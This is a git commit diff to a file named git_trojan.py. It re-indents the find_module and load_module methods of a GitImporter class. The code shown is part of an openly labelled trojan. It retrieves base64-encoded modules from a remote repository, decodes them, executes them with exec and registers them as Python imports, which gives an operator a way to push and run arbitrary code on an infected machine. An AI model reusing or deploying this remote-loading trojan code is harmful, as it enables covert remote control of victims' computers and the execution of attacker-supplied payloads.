00a07c62f105745f229ebad0752e02d8c5897742
Joey Tribbiani <JoeyFrancisTribbiani@outlook.com>
2017-04-10 21:31:02 +0800

    tab sub

--- git_trojan.py
+++ git_trojan.py
@@ -66,22 +66,22 @@ class GitImporter(object):
     def __init__(self):
         self.current_module_code = ""
 
-        def find_module(self, fullname, path=None):
-            if configured:
-                print "[*] Attempting to retrieve %s" % fullname
-                new_library = get_file_contents("modules/%s" % fullname)
+    def find_module(self, fullname, path=None):
+        if configured:
+            print "[*] Attempting to retrieve %s" % fullname
+            new_library = get_file_contents("modules/%s" % fullname)
 
-                if new_library is not None:
-                    self.current_module_code = base64.b64decode(new_library)
-                    return self
-            return None
+            if new_library is not None:
+                self.current_module_code = base64.b64decode(new_library)
+                return self
+        return None
 
-        def load_module(self, name):
-            module = imp.new_module(name)
-            exec self.current_module_code in module.__dict__
-            sys.modules[name] = module
+    def load_module(self, name):
+        module = imp.new_module(name)
+        exec self.current_module_code in module.__dict__
+        sys.modules[name] = module
 
-            return module
+        return module
 
 
 def module_runner(module):
